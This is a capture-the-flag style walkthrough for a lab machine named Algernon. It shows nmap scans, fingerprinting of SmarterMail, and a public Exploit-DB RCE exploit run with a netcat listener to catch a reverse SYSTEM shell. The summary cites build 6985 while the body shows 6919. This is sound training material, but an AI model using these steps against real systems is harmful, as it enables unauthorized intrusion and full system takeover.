____

# Exploitation Guide for Algernon

## Summary

We will exploit this machine via a remote code execution vulnerability in build 6985 of the SmarterMail application.

## Enumeration

### Nmap

Let's start with an `nmap` scan against all TCP ports:

```
kali@kali:~$ sudo nmap -p- 192.168.120.110
Nmap scan report for 192.168.120.110
Host is up (0.28s latency).
Not shown: 65527 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
9998/tcp  open  distinct32
17001/tcp open  unknown
```

Port 9998 seems interesting. Let's scan it more aggressively.

```
kali@kali:~$ sudo nmap -A -p 9998 192.168.120.110
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-12 06:00 EDT
Nmap scan report for 192.168.120.110
Host is up (0.31s latency).

PORT     STATE SERVICE VERSION
9998/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /interface/root
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.48 seconds
```

This seems to be a Microsoft IIS application. Browsing to port 9998, we discover that the application is SmarterMail version 6919:

```
kali@kali:~$ curl -L http://192.168.120.110:9998

<!DOCTYPE html>
...
var cssVersion = "100.0.6919.30414.8d65fc3f1d47d00";
var stProductVersion = "100.0.6919";
var stProductBuild = "6919 (Dec 11, 2018)";
...
```

## Exploitation

### RCE

Searching the Exploit Database, we discover a [remote code execution vulnerability](https://www.exploit-db.com/exploits/49216) for an older version of this software. Although the version numbers differ, we'll attempt this exploit against this target.

We'll download the exploit, update the `HOST` and `LHOST` variables as needed, and set `LPORT` to 17001.

Next, we'll set up a netcat listener on port 17001 and launch the exploit.

```
kali@kali:~$ python3 49216.py
```

Our listener indicates that we have obtained a SYSTEM shell.

```
kali@kali:~$ nc -lvp 17001
listening on [any] 17001 ...
192.168.120.110: inverse host lookup failed: Unknown host
connect to [192.168.118.6] from (UNKNOWN) [192.168.120.110] 49852
whoami
nt authority\system
PS C:\Windows\system32>
```

## Escalation

Since we have SYSTEM privileges on the target, no further escalation is required.
